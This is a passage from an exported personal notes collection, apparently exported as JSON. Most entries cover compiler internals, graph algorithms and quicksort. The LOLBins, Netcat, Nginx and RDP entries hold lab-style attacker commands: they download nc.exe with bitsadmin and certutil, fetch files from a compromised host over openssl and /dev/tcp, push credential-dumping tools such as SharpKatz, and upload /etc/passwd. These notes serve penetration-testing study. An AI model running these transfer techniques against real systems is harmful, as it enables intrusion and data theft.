target:\n\n![x86-target-definition-example](notes/images/x86-target-definition-example.png)\n\nThe different subsystems supported by the `.td` files allow target authors to build up the different pieces of their target. For example, the x86 back end defines a register class that holds all of its 32-bit registers name \"GR32\", like this:\n\n```LLVM\ndefine GR32 : RegisterClass\u003c[i32], 32,\n  [EAX, ECX, EDX, ESI, EDI, EBX, EBP, ESP,  \n   R8D, R9D, R10D, R11D, R14D, R15D, R12D, R13D]\u003e { ... }\n```\n\nThe language used in the `.td` files are Target(Hardware) Description Language that let lvvm backend compiler engineers to define the transformations for llvm IR and the machine instructions of their CPUs. \n\nIn frontend, compiler development tools provide the \"ParseGenerator\" for compiler development; in backend they provide the \"Machine Code Generator\" for development, as you can see below:\n\n![front-tablegen-flow](notes/images/front-tablegen-flow.png)\n\n![notes/imagesllvm-tablegen-flow.png](notes/imagesllvm-tablegen-flow.png)\n\n## Code Generation Sequence\nFrom tricore_llvm.pdf:\n\n![llvm-code-generation-sequence](notes/images/llvm-code-generation-sequence.png)\n\nLLVM is a Static Single Assignment (SSA) based representation. LLVM provides an infinite virtual registers which can hold values of primitive type (integral, floating point, or pointer values). So, every operand can be saved in different virtual register in llvm SSA representation. Comment is “;” in llvm representation. Following is the llvm SSA instructions:\n\n```LLVM\nstore i32 0, i32* %a  ; store i32 type of 0 to virtual register %a, %a is  \n                      ; pointer type which point to i32 value  \nstore i32 %b, i32* %c ; store %b contents to %c point to, %b isi32 type virtual  \n                      ; register, %c is pointer type which point to i32 value.  \n%a1 = load i32* %a    ; load the memory value where %a point to and assign the  \n                      ; memory value to %a1  \n%a3 = add i32 %a2, 1  ; add %a2 and 1 and save to %a3\n```\n\nHere you can see the code generation process:\n\n1. Instruction Selection\n```LLVM\n; In this stage, transfer the llvm opcode into machine opcode, but the operand  \n; still is llvm virtual operand.  \n   store i16 0, i16* %a ; store 0 of i16 type to where virtual register %a  \n                        ; point to.  \n=\u003e st i16 0, i32* %a    ; Use Cpu0 backend instruction st instead of IR store.\n```\n\n2. Scheduling and Formation\n```LLVM\n; In this stage, reorder the instructions sequence for optimization in  \n; instructions cycle or in register pressure.  \n   st i32 %a, i16* %b, i16 5 // st %a to *(%b+5)  \n   st %b, i32* %c, i16 0  \n   %d = ld i32* %c  \n; Transfer above instructions order as follows. In RISC CPU of Mips, the ld  \n; %c uses the result of the previous instruction st %c. So it must waits 1  \n; cycle. Meaning the ld cannot follow st immediately.  \n=\u003e st %b, i32* %c, i16 0  \n   st i32 %a, i16* %b, i16 5  \n   %d = ld i32* %c, i16 0  \n; If without reorder instructions, a instruction nop which do nothing must be  \n; filled, contribute one instruction cycle more than optimization. (Actually,  \n; Mips is scheduled with hardware dynamically and will insert nop between st  \n; and ld instructions if compiler didn't insert nop.)  \n   st i32 %a, i16* %b, i16 5  \n   st %b, i32* %c, i16 0  \n   nop  \n   %d = ld i32* %c, i16 0  \n; Minimum register pressure  \n; Suppose %c is alive after the instructions basic block (meaning %c will be  \n; used after the basic block), %a and %b are not alive after that.  \n; The following no-reorder-version need 3 registers at least  \n   %a = add i32 1, i32 0  \n   %b = add i32 2, i32 0  \n   st %a, i32* %c, 1  \n   st %b, i32* %c, 2  \n; The reorder version needs 2 registers only (by allocate %a and %b in the same  \n; register)  \n=\u003e %a = add i32 1, i32 0  \n   st %a, i32* %c, 1  \n   %b = add i32 2, i32 0  \n   st %b, i32* %c, 2\n```\n\n3. SSA-based Machine Code Optimisation\n\n4. Register Allocation\nAllocate real register for virtual register.\n\n5. Prologue/Epilogue Code Insertion\n\n6. Late Machine Code Optimisations\nAny 'last-minute' peephole optimisations for the final machine code can be applied during this phase.\n\n7. Code Emission\nFor static compilation, the end result is an assembly code file. For JIT compilation, the opcodes of the machine instructions are written into memory.\n\n## LLVM vs GCC in structure\nRelated to [gcc](notes/general/gcc.md).\n\n![gcc-vs-llvm-structure](notes/images/gcc-vs-llvm-structure.png)\n\n## Online resources\n-   [LLVM Compiler Infrastructure documentation](https://llvm.org/docs/)\n-   [LLVM YouTube channel](https://www.youtube.com/channel/UCv2_41bSAa5Y_8BacJUZfjQ)\n- [Tutorial LLVM backend](https://jonathan2251.github.io/lbd/TutorialLLVMBackendCpu0.pdf)\n- [LLVM Backend - Code Generator](https://llvm.org/docs/CodeGenerator.html)\n- [LLVM Official Tutorials](https://llvm.org/docs/tutorial/)\n- [Writing Your Own Toy Compiler Using Flex, Bison and LLVM](https://gnuu.org/2009/09/18/writing-your-own-toy-compiler/)\n\n### Mailing lists\n-   [The llvm-dev Archives](https://lists.llvm.org/pipermail/llvm-dev/)\n\n## Resources\n- [How to Write a LLVM Backend](notes/general/how-to-write-a-llvm-backend.md)\n",
    "lastmodified": "2022-11-24T12:21:00.479189038Z",
    "tags": null
  },
  "/notes/general/lolbins": {
    "title": "LOLBins",
    "content": "# LOLBins\n---\nAka Living off the land binaries, which are binaries that an attacker can use to perform actions beyond their original purpose.\n\nTwo websites on this:\n- LOLBAS Project for **Windows** Binaries ([here](https://lolbas-project.github.io/#))\n- GTFOBins for **Linux** Binaries ([here](https://gtfobins.github.io/))\n\nThey can be used to perform actions like:\n- Download\n- Upload\n- Command Execution\n- File Read\n- File Write\n- Bypasses\n\n## GTFOBins\nWe can search for the download and upload function using `+file download` and `+file upload`:\n\nWe can use **openssl**. We first need to create a certificate and start a server.\n\n### Create Certificate in Pwnbox\n```bash\nopenssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem\n```\n\n### Stand up the Server in our Pwnbox\n```bash\nopenssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem \u003c /tmp/LinEnum.sh\n```\n\nNow to download the file from the compromised machine.\n\n### Download File from the Compromised Machine\n```bash\nopenssl s_client -connect 10.10.10.32:80 -quiet \u003e LinEnum.sh\n```\n\n## Other Lol Tools\n### Bitsadmin Download function\nThe Background Intelligent Transfer Service ([BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)) can be used to download files from HTTP sites and SMB shares.\n\n#### File download with bitsadmin\n```powershell\nPS bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe\n```\n\n#### Download\n```powershell\nImport-Module bitstransfer; Start-BitsTransfer -Source \"http://10.10.10.32/nc.exe\" -Destination \"C:\\Temp\\nc.exe\"\n```\n\n#### Upload\n```powershell\nStart-BitsTransfer \"C:\\Temp\\bloodhound.zip\" -Destination \"10.10.10.132/uploads/bloodhound.zip\" -TransferType Upload -ProxyUsage Override-ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\\svc-sql\n```\n\n### Certutil\nA defacto to `wget`. The Antimalware Scan Interface (AMSI) detects this as malicious Certutil usage:\n\n```bash\ncerutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe\n```",
    "lastmodified": "2022-11-24T12:21:00.517481923Z",
    "tags": null
  },
  "/notes/general/minimum-spanning-tree": {
    "title": "Minimum Spanning Tree",
    "content": "# Minimum Spanning Tree\n---\nIt is a subtree with the minimum possible edge weight that connects all nodes together.\n\nThere must exist **no cycles** in the tree, meaning it is usually a **complete** [graph](notes/general/graphs.md).\n\nThe **cost** of a spanning tree is the sum of all the edge weights and a minimum spanning tree (MST) is the spanning tree with the minimum cost.\n\nA graph **can** have multiple minimum spanning subtrees:\n![minimum_spanning_subtree](notes/images/minimum_spanning_subtree.png)\n\nThe two most popular algorithms are [Kruskal's](notes/general/kruskals-algorithm.md) and [Prim's](notes/general/prims-algorithm.md).\n\n## Example\n![Screenshot 2022-11-07 at 11.47.26](notes/images/Screenshot%202022-11-07%20at%2011.47.26.png)\n\n![400](notes/images/Screenshot%202022-11-07%20at%2011.47.39.png)\n\n## Applications\nNetwork Design:\n- Computer networks, telecommunications networks, transportation networks, water supply networks etc.\n\nCfA redshift survey:\n- MSTs used for understanding the large-scale structure of the universe.\n\nApproximation algorithms for NP-hard problems:\n- Travelling salesperson problem.\n\nCancer imaging:\n- The British Columbia Cancer Research centre uses them to describe the arrangements of nuclei in skin cells.\n\n## Visualisation\nPrim's Algorithm for working out the Minimum Spanning Trees: [https://www.cs.usfca.edu/~galles/visualization/Prim.html](https://www.cs.usfca.edu/~galles/visualization/Prim.html)\n\n## See also\n- [Trees](notes/general/trees.md)\n- [Graphs](notes/general/graphs.md)\n",
    "lastmodified": "2022-11-24T12:21:00.554154038Z",
    "tags": null
  },
  "/notes/general/netcat": {
    "title": "Netcat",
    "content": "# Netcat\n---\nNetworking utility for reading from and writing to network connections using TCP or UDP.\n\n## Listening\n```bash\nvictim@target:~$ nc -l -p 8080 \u003e SharpKatz.exe\n```\n\n```bash\nvictim@target:~$ cat \u003c /dev/tcp/192.168.0.200/8080 \u003e SharpKatz.exe\n```\n\n## Sending\n```bash\nme@hanato:~$ nc -q 0 192.168.0.200 8080 \u003c SharpKatz.exe\n```",
    "lastmodified": "2022-11-24T12:21:00.582508445Z",
    "tags": null
  },
  "/notes/general/newton-raphson": {
    "title": "Newton-Raphson Iteration",
    "content": "# Newton-Raphson Iteration\n---\nWant to find the root of $f(x)$, for example a value for $x$ such that $f(x) = 0$.\n\nNewton-Raphson starts with an initial estimate, $x_0$, and computes a better estimate, $x_1$\n$x_1 = x_0 - \\dfrac {f(x_0)}{f'(x_0)}$\n\nFor example, to compute $\\dfrac {1}{b}$, we use:\n$f(x) = \\dfrac {1}{x} - b$\n        $=$ $x^{-1} - b$\n        \n$f'(x) = -x^{-2}$\n\nLeading to the formula:\n$x_1 = x_0 - \\dfrac {x_0^{-1} - b}{-x_0^{-2}}$\n     $=$ $2x_0 - bx_0^{2}$\n\n## Division\n$c = \\dfrac {a}{b}$\n\nCompute $r = \\dfrac {1}{b}$, then $c = r * a$\n\nAlgorithm:\n  - $r_0$ as guess for $\\dfrac {1}{b}$.\n  - $r_{i+1} = 2r_i = br_i^{2}$ (Newton-Raphson)\n\nSecond order convergent, so $O(log\\ r)$.\n\n---\n## See Also\n- [](notes/general/algorithms-and-data-structure.md#Mathematical%20Algorithms%7CMathematical%20Algorithms)",
    "lastmodified": "2022-11-24T12:21:00.599889755Z",
    "tags": null
  },
  "/notes/general/nginx": {
    "title": "Nginx",
    "content": "# Nginx\n---\nUsed for transferring files to Apache.\n\n## Create Directory to Handle Uploaded Files\n```bash\nsudo mkdir -p /var/www/uploads/SecretUploadDirectory\n```\n\n## Change the Owner to www-data\n```bash\nsudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory\n```\n\n## Create Nginx Configuration File\nIn `/etc/nginx/sites-available/upload.conf`:\n\n```bash\nserver {\n    listen 9001;\n\n    location /SecretUploadDirectory/ {\n        root /var/www/uploads;\n        dav_methods PUT;\n    }\n}\n```\n\n## Symlink our Site to the sites-enabled Directory\n```bash\nsudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx//sites-enabled/\n```\n\n## Start Nginx\n```bash\nsudo systemctl restart nginx.service\n```\n\nError messages can be found in: `/var/log/nginx/error.log`.\n\nFor example:\n\n```bash\nss -lnpt | grep '80'\n```\n\n```bash\nps -ef | grep '2811'\n```\n\nCould output something like `python -m websockify 80 localhost:5901 -D` which means there is a module already listening to port 80. To get around we can get rid of the default Nginx configuration:\n\n```bash\nsudo rm /etc/nginx/sites-enabled/default\n```\n\nAnd now we test:\n\n```bash\ncurl -T /etc/passwd\n```\n\n```bash\ntail -1 /var/www/upload/SecretUploadDirectory/users.txt\n```\n\nThen we can navigate to `http://localhost/SecretUploadDirectory`.",
    "lastmodified": "2022-11-24T12:21:00.638777971Z",
    "tags": null
  },
  "/notes/general/nmap-cheatsheet": {
    "title": "Nmap Cheatsheet",
    "content": "# Nmap Cheatsheet\n---\n| **nmap flag**   | **Description**                                            |\n| --------------- | ---------------------------------------------------------- |\n| `-sV`           | Versions                                                   |\n| `-p \u003cx\u003e or -p-` | Port scan for port \u003cx\u003e or all                              |\n| `-Pn`           | Disable host discovery                                     |\n| `-A`            | Enables OS and version detection, execute built-in scripts |\n| `-sC`           | Scan with the default nmap scripts                         |\n| `-v`            | Verbose mode                                               |\n| `-sU`           | UDP port scan                                              |\n| `-sS`           | TCP SYN port scan`                                         |\n",
    "lastmodified": "2022-11-24T12:21:00.651295424Z",
    "tags": null
  },
  "/notes/general/p-vs-np": {
    "title": "P vs NP Problem",
    "content": "# P vs NP Problem\n---\nImagine an Oracle. Guesses and gets the right answer.\n\nBuild by (infinitely) many processors in a tree. If $2^n$ possible answers, tree is $n$ deep. A non-deterministic computer.\n\n- _P_ - the set of problems solvable in polynomial time.\n- _NP_ - the set of problems solvable in polynomial time on a non-deterministic computer.\n    - Alternatively, verifiable in polynomial time on a deterministic computer.\n- _NP hard_ - any problem at least as hard as the hardest problems in _NP_.\n- _NP complete_ - a set of _NP hard_ problems, all of which are equivalent.\n\n- $P$ $\\subseteq$ $NP$\n- $NP$ $\\neq$ $P$ has not been proven yet, but widely believed to be true.\n\n![p-np](notes/images/p-np.png)\n\n## See also\n- [Problems](notes/general/cs-problems.md)\n",
    "lastmodified": "2022-11-24T12:21:00.662626863Z",
    "tags": null
  },
  "/notes/general/parlab": {
    "title": "Parallel Computing Laboratory",
    "content": "# Parallel Computing Laboratory\n---\nThe Par Lab was a five-year project to advance parallel computing funded by Microsoft and Intel for $10M over 5 years, from 2008 to 2013. It also received funding from several other companies and the State of California. \n\nProf. David Patterson was the Director.\n\nThe Chisel hardware construction language was used to design many RISC-V processors was also developed in the Par Lab.\n\nAll projects were **open source** using the Berkeley Software Distribution (BSD) license, including RISC-V and Chisel.\n\nThey never explicitly ask for RISC-V itself, their interest was in parallel processing systems.\n\nMore info: [The Berkeley Par Lab: Progress in the Parallel Computing Landscape](https://www.amazon.com/Berkeley-Par-Lab-Computing-Landscape-ebook/dp/B00EQM51I4?)\n",
    "lastmodified": "2022-11-24T12:21:00.68049407Z",
    "tags": null
  },
  "/notes/general/parse-trees": {
    "title": "Parse Trees",
    "content": "# Parse Trees\n---\n![parse-tree-example](notes/images/parse-tree-example.png)\n\n## Grammatically \n$S \\rightarrow A | B$\n$A \\rightarrow A\\ x | y$\n$B \\rightarrow z$\n\n- Parse tree for *yxxz*:\n![parse-tree](notes/images/parse-tree.png)\n\n### Parsing Sentences\nApply successive productions.\n\nConsider parsing the sentence **yz** using this grammar:\n\nS $\\rightarrow$ AB\nA $\\rightarrow$ A x|y\nB $\\rightarrow$ z\n\nWe use three productions:\n\nS $\\rightarrow$ AB  (giving sentential form AB)\nA $\\rightarrow$ y  (giving sentential form yB)\nB $\\rightarrow$ z  (giving the sentence yz)\n\nThis is a **leftmost derivation**.\n\nWe could instead have used:\n\nS $\\rightarrow$ AB (giving the sentential form AB)\nB $\\rightarrow$ z (giving the sentential form Az)\nA $\\rightarrow$ y (giving the sentential form yz)\n\nThis is a **rightmost derivation**.\n\nWhilst the resulting parse tree is the same, the order of the the derivation governs the order in which the language structures appear in the parse tree as it is built.\n\n## C Representation\n```c\nstruct node {\n  int nodetype;\n  struct node *field1;\n  struct node *field2;\n  struct node *field3;\n  struct node *field4;\n  struct node *field5;\n}\n```\n\n- `nodetype` can be defined as small constants:\n```c\n#define NT_PROGRAM 1\n#define NT_FUNCTION_LIST 2\n#define NT_FUNCTION 3\n...\n```\n\n### Simplification\nNo need for a **program** node, use `function_list`.\n\nAvoid lexical detail, for example:\n\ninteger $\\rightarrow$ digit | integer digit\ndigit      $\\rightarrow$ 0 | 1 | ... | 8 | 9\n\nJust add a appropriate fields to `struct` node:\n```c\nstruct nnode {\n  int nodetype;\n  struct node *field1;\n  ...\n  struct node *field5;\n  char *name; // variables and text\n  int value;  // integer constants\n}\n```\n\n## DAGs for Parse Trees\nA DAG (Directed Acyclic Graph) can allow us to share common parse tree structures. It saves space and identifies possible common sub-expressions for optimisation.\n\nHowever, they are hard to construct and syntactic identify does not mean semantic identity.\n\n## See Also\n- [Formal Languages](notes/general/formal-languages.md)\n- [Trees](notes/general/trees.md)\n",
    "lastmodified": "2022-11-24T12:21:00.687113643Z",
    "tags": null
  },
  "/notes/general/plt-and-got": {
    "title": "PLT and GOT",
    "content": "## Procedure Linkage Table and Global Offset Table\nIf a program receives an incorrect input for example, it terminates, rendering useless all of the relocation work performed by the [dynamic linker](notes/general/linker.md). To solve this, we can resolve function references **when they are called** instead of at load-time.\n\nThis is enabled by the Procedure Linkage Table (PLT) and the Global Offset Table (GOT).\n\n- GOT: holds entries of addresses of global variables and external functions.\n- PLT: short entries of instructions used to reach external functions by redirecting control flow of execution to its corresponding GOT entry.\n\nIn general, external functions are reached by calling their respective PLT entry:\n\n![Pasted image 20220802105911](notes/images/Pasted%20image%2020220802105911.png)\n\nThen the PLT entry will retrieve the function's address from the function's GOT entry, and call it:\n\n![Pasted image 20220802105930](notes/images/Pasted%20image%2020220802105930.png)\n\n---\n## Related Notes\n- [Relocations](notes/general/relocations.md)\n- [Linker](notes/general/linker.md)\n- [Howto Table](notes/general/howto-table.md)\n- [Linker Relaxation](notes/general/linker-relaxation.md)\n- [Jump Table](notes/general/jump-table.md)",
    "lastmodified": "2022-11-24T12:21:00.717485547Z",
    "tags": null
  },
  "/notes/general/prims-algorithm": {
    "title": "Prim's Algorithm",
    "content": "# Prim's Algorithm\n---\nIt is a [minimum spanning tree](notes/general/minimum-spanning-tree.md) algorithm.\n\nIt scales well, fast with dense [graphs](notes/general/graphs.md).\n\nIt has a [](notes/general/compiler-optimisation.md#Performance%7Cperformance) of $O_{E\\ log\\ N}$ with [binary heap](notes/general/binary-heap.md) and $O_{E\\ +\\ log\\ N}$ with Fibonacci heap.\n\nIt works like this:\n1. Choose any node.\n2. Choose nearest node that is not included in the spanning subtree formed so far.\n3. Repeat step 2 until all nodes are included in the subtree.\n\n![prims](notes/images/prims.png)\n\n## Pseudo-Code\n```\nAlgorithm 4. PrimsMST(G=(V,E))  \nInput: G- a weighted graph (V- vertices, E- Edges)  \n1) Let x be a random node from V  \n2) Let Vnew = {x}  \n3) Let Enew = {}  \n4) While Vnew  V  \n5) Choose an edge (u,v) with minimal weight,  \nsuch that u  Vnew and v  Vnew  \n6) Vnew = Vnew  {v}  \n7) Enew = Enew  {(u,v)}  \n8) Wend  \nOutput: Gnew = (Vnew,Enew)\n```\n\n## Example\n![650](notes/images/Screenshot%202022-11-07%20at%2011.48.43.png)\n\n## See also\n- [Minimum Spanning Tree](notes/general/minimum-spanning-tree.md)\n- [Trees](notes/general/trees.md)\n- [Graphs](notes/general/graphs.md)\n- [Big O Notation](notes/general/big-o-notation.md)\n- [Kruskal's](notes/general/kruskals-algorithm.md)\n",
    "lastmodified": "2022-11-24T12:21:00.848485708Z",
    "tags": null
  },
  "/notes/general/quicksort": {
    "title": "Quicksort",
    "content": "# Quicksort\n---\nIt picks a **midpoint** (approximate the median) and partition values, into those less than the **midpoint** (left) and greater (right).\n\nThen **recurse** on each partition in turn until there is one value in each partition.\n\n![500](notes/images/Screenshot%202022-10-24%20at%2017.05.09.png)\n\nThere are many different versions of Quicksort, based on the different ways of picking the pivot:  \n- Pivot always being the first element.\n- Pivot always being the last element.  \n- Pivot is selected randomly.\n- The median is chosen as the pivot.\n\n## Pseudo-Code\n![400](notes/images/Screenshot%202022-10-24%20at%2017.06.59.png)\n\n## PivotList Pseudo-Code\nIn the worst case, it will do $n-1$ comparisons, but **creates one partition that has $n-1$ elements and the other will have no elements**. This happens because we wind up reducing the partition by one element each time.\n\nWorst case: $O(n^2)$\n\nFor the best case, it creates two parts that are the same size. Then all the subsequent parts are the same size as the algorithm calls itself, which can be modelled as a [binary tree](notes/general/binary-trees.md).\n\nBest case: $O(n log_2(n))$\n\n![550](notes/images/Screenshot%202022-10-24%20at%2017.06.00.png)\n\n## Implementation\n```c\nvoid\nquicksort (int *a, int lo, int hi)\n{\n  if (lo \u003c hi)\n  {\n    int p = partition (a, lo, hi);\n    quicksort (a, lo, p);\n    quicksort (a, p + 1, hi);\n  }\n}\n```\n\n## Issues\n- It is not [](notes/general/sorting.md#Stability%7Cstable).\n- Average [](notes/general/compiler-optimisation.md#Performance%7Cperformance): $O_{n\\ log\\ n}$ \n- Worst case performance: $O_(n^2)$\n\nNote that this is [big O notation](notes/general/big-o-notation.md).\n\nQuicksort is critically dependant on choice of median. Taking best of low, high and mid points deals with the obvious case of sorted data.\n\nIt is implemented as **qsort** in the standard C maths library.\n\n## Quicksort Partition\n```c\nint\npartition (int *a, int lo, int hi)\n{\n  int pivot = a[lo];            /* Guess median */\n  int i = lo - 1, j = hi + 1;\n\n  while (1)\n  {\n    do                          /* Leftmost element \u003e= pivot */\n      i++;\n    while (a[i] \u003c pivot);\n    do                          /* Rightmost element \u003c= pivot */\n      j--;\n    while(a[j] \u003e pivot);\n    if (i \u003e= j)\n      return j;\n    swap (\u0026(a[i]), \u0026(a[j]));\n  }\n}\n```\n\n### Output\n```bash\n16 16  0 14  9 11 10  2  3  4  1 11  8 17 14  5 11 12 15 16\n16 16  0 14  9 11 10  2  3  4  1 11  8 17 14  5 11 12 15 16\n16 15  0 14  9 11 10  2  3  4  1 11  8 17 14  5 11 12 16 16\n16 15  0 14  9 11 10  2  3  4  1 11  8 12 14  5 11 17 16 16\n11 15  0 14  9 11 10  2  3  4  1 11  8 12 14  5 16 17 16 16\n 5 15  0 14  9 11 10  2  3  4  1 11  8 12 14 11 16 17 16 16\n 5  8  0 14  9 11 10  2  3  4  1 11 15 12 14 11 16 17 16 16\n 5  8  0 11  9 11 10  2  3  4  1 14 15 12 14 11 16 17 16 16\n 5  8  0 11  9  1 10  2  3  4 11 14 15 12 14 11 16 17 16 16\n 4  8  0 11  9  1 10  2  3  5 11 14 15 12 14 11 16 17 16 16\n 4  3  0 11  9  1 10  2  8  5 11 14 15 12 14 11 16 17 16 16\n 4  3  0  2  9  1 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 4  3  0  2  1  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 1  3  0  2  4  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 0  3  1  2  4  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 0  2  1  3  4  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  9 10 11  8  5 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5 10 11  8  9 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5  8 11 10  9 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 14 15 12 14 11 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 15 12 14 14 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 14 12 15 14 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 12 14 15 14 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 12 14 14 15 16 17 16 16\n 0  1  2  3  4  5  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n 0  1  2  3  4  5  8  9 10 11 11 11 12 14 14 15 16 16 16 17\n```\n\n### As a tree-sort\n![quicksort-tree](notes/images/quicksort-tree.png)\n\n## Code Example\n```c\n/* Basic Quicksort\n\n   Copyright (C) 2020 Embecosm Limited \u003cwww.embecosm.com\u003e\n   Contributor: Jeremy Bennett \u003cjeremy.bennett@embecosm.com\u003e\n   SPDX-License-Identifier: GPL-3.0-or-later */\n\n/* This version uses Tony Hoare's original algorithm as described in Comp. J,\n * 5(1), April 1962, pp 10-15. */\n\n#include \u003cstdlib.h\u003e\n#include \u003cstdio.h\u003e\n\n#ifndef N\n#define N 20\n#endif\n\nvoid\npopulate (int arr[])\n{\n  for (int i = 0; i \u003c N; i++)\n    arr[i] = rand () % N;\n}\n\nvoid\nswap (int *a, int *b)\n{\n  int t = *a;\n  *a = *b;\n  *b = t;\n}\n\nvoid\ndump_array (int arr[])\n{\n  for (int i = 0; i \u003c N; i++)\n    printf (\"%2d \", arr[i]);\n\n  printf (\"\\n\");\n}\n\nint median (int x, int y, int z)\n{\n  int b[] = {x, y, z};\n  int j, k;\n\n  for (k = 1; k \u003c 3; k++)\n    for (j = k; (j \u003e 0) \u0026\u0026 (b[j] \u003c b[j - 1]); j--)\n      swap (\u0026(b[j]), \u0026(b[j - 1]));\n\n  return b[1];\n}\n\n/* Partition data around pivot, returning the index of the pivot as result */\nint\npartition (int *a, int lo, int hi)\n{\n#ifdef MEDIAN\n  int pivot = median (a[lo], a[hi], a[(lo + hi) / 2]);\n#else\n  int pivot = a[lo];\n#endif\n  int i = lo - 1;\t\t/* Don't worry gets incremented before use! */\n  int j = hi + 1;\t\t/* Don't worry gets decremented before use! */\n\n  while (1)\n    {\n      do\t\t\t/* Leftmost element \u003e= pivot */\n\ti++;\n      while (a[i] \u003c pivot);\n\n      do\t\t\t/* Rightmost element \u003c= pivot */\n\tj--;\n      while (a[j] \u003e pivot);\n\n      if (i \u003e= j)\t\t/* Two pointers have met */\n\treturn j;\n\n      swap (\u0026(a[i]), \u0026(a[j]));\n      dump_array (a);\n    }\n}\n\n/* Find a pivot, partition around that pivot, recurse on each partition */\nvoid\nquicksort (int *a, int lo, int hi)\n{\n  if (lo \u003c hi)\n    {\n      int p = partition (a, lo, hi);\n      quicksort (a, lo, p);\n      quicksort (a, p + 1, hi);\n    }\n}\n\nint\nmain ()\n{\n  int a[N];\n  int i, j, k, m;\n\n  srand (561U);\n\n  populate (a);\n  dump_array (a);\n\n  quicksort (a, 0, N - 1);\n\n  return 0;\n}\n\n/*\nLocal Variables:\nmode: C\nc-file-style: \"gnu\"\nEnd:\n*/\n```\n",
    "lastmodified": "2022-11-24T12:21:00.868101835Z",
    "tags": null
  },
  "/notes/general/rdp": {
    "title": "RDP",
    "content": "# RDP\n---\nStands for Remote Desktop Protocol.\n\n## Mounting using rdesktop\n```bash\nrdesktop 10.10.10.132 -d HTB -u administrator -p 'Password' -r disk:linux='home/user/rdesktop/files'\n```\n\n```bash\nxfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password' /drive:linux,home/plaintext/htb/academy/filetransfer'\n```\n\nWe can then go to `\\\\tsclient\\` directory to transfer files to and from the RDP session.",
    "lastmodified": "2022-11-24T12:21:00.939724207Z",
    "tags": null
  },
  "/notes/general/relocations": {
    "title": "Relocations",
    "content": "# Relocations\n---\n```toc\n```\n---\nDifferent programs will be different sizes, so when the shared library gets mapped into the address space of different programs, it will be at different addresses. This in turn means that all of the functions and variables in the library are in different places. \n\nNow, if all of the ways of referring to addresses are relative (\"the value +1020 bytes from here\") rather than absolute (\"the value at `0x102218BF`\") this is less of a problem, but this isn't always possible. If not, then all of these absolute addresses need to have a suitable offset added to them — this is relocation.\n\n## What are relocations?\nSymbolic references and symbolic definitions have to be connected with one another. The mechanism to connect them is what is known as relocations.\n\nA relocation can be thought of as a note that a particular address will need to be fixed at load time. Before the code is ready to run you will need to go through and read all the relocations and fix the addresses it refers to to point to the right place.\n\nFor example, we have a program that adds the value of two global variables together. In order for them to be successfully referenced, their address have to resolved. Or for example if the program is calling a function from an external dependency, the address of that function will also have to be computed prior to transferring control of execution to it.\n\nDuring compilation, there is a specific stage were relocatable objects are generated. They contain all the information required to map symbolic references to its corresponding definitions. Populating symbolic references on symbolic definitions takes place during the linking phase of the compilation process.\n\nCompilation process:\n\n![Pasted image 20220802100501](notes/images/Pasted%20image%2020220802100501.png)\n\nWe can relocate:\n\n- Generic object files (`*.o`)\n- Kernel object files (`*.ko`)\n- Shared object files (`*.so`)\n\nGeneric object files are the ones used for static linking, they are only relevant in the compilation process and essentially, any given symbolic definition will become part of the main executable being generated.\n\nSome of the benefits are that there is no need to rely on external dependencies. On the other hand, they can become pretty large as they need all of the dependencies in the binary.\n\nShared objects support being linked on runtime, and they may be shared across different processes. However, relocations of dynamic dependencies have to be done at runtime -\u003e [**dynamic linking**](notes/general/linker.md).\n\nThey happen at runtime because the symbolic definitions do not exist within the main binary's context, but within external shared objects. These dynamic references do not get populated until the correspondent external dependencies are loaded in memory.\n\n## Relocation Entries\nRelocation information is held in relocatable entries, located in specific relocation sections within the ELF object. They are implemented in the form of structures, there are two different ones: `Elfxx_Rel` and `Elfxx_Rela`:\n\n![Pasted image 20220802101452](notes/images/Pasted%20image%2020220802101452.png)\n\nThe only different is that `Rela` has an extra field for the addend. They are mutually exclusive, meaning only one type of entry is used.\n\nNormally the type of entry is architecture dependant, for example in x86 `Elf32_Rel` is used whereas for `x86_64` they use `Elf64_Rela`.\n\nWhat do the fields mean?\n\n- `r_offset`: holds the location where a particular relocation has to take place, address to fix.\n- `r_info`: both the symbol index within a symbol table of the correspondent symbol that has to be relocation and the relocation type for that specific symbol. What has to be done to fix this code up, a \"fix-up\". They are retrieved using macros like:\n\n```c\nELF32_R_SYM(info)((info)\u003e\u003e8)\nELF32_R_TYPE(info)((unsigned char)(info))\n```\n\n- `r_addend`: a constant addend to be added to compute the value to be stored in a given relocation reference. For example, if the relocation is for symbol `i` because the original code is doing something like `i[8]`, the addend will be set to 8. This means: find address of i and go 8 past it.\n\nRelocation entries are always found in some relocation section, every relocation section may reference two additional sections:\n\n- A relocation section will always be linked to its corresponded symbol table. The table can be located as a section in the section header table, and its index can be retrieved by the `sh_link` field of the relocation section's `Elfxx_Shdr` instance.\n- The section index where to apply the offset can be retrieved by the relocation section's `Elxx_Shdr sh_info` field.\n\n![Pasted image 20220802102836](notes/images/Pasted%20image%2020220802102836.png)\n\nAs you can see, the relocation section is linked to two other sections. One of them is the symbol table, where the symbols that will be relocated are held. In this example, the section is the `.dynsym` section, the symbol table that holds symbols for dynamic linking.\n\nThe additional section linked to the relocation section is where the relocations are going to take place: the **.got.plt** section, which holds a table of pointers (an interface for the application to access relocated dynamically linked procedures addresses).\n\n## 